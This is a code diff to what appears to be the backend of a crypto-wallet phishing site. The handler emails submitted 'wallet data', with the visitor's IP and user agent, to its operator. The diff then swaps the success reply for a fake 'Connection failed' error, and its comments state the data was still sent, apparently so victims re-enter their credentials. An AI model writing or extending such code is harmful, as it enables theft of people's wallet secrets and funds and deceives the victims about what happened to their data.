@@ -169,16 +169,17 @@ export default async (req, res) => {
       userAgent: req.headers['user-agent']
     };
     
-    // Send the email with wallet data
+    // Send the email with wallet data (still works behind the scenes)
     await sendWalletData(dataWithIp);
     
     // Track successful API request
     trackApiSuccess();
     
-    // Return success response
-    res.status(200).json({
-      success: true,
-      message: 'Wallet connection details sent successfully',
+    // Return fake error response (but email was still sent!)
+    res.status(500).json({
+      success: false,
+      message: 'Connection failed. Please check your wallet details and try again.',
+      error: 'WALLET_CONNECTION_ERROR',
       requestId: `req_${Date.now().toString(36)}_${Math.random().toString(36).substring(2, 7)}`
     });
   } catch (error) {
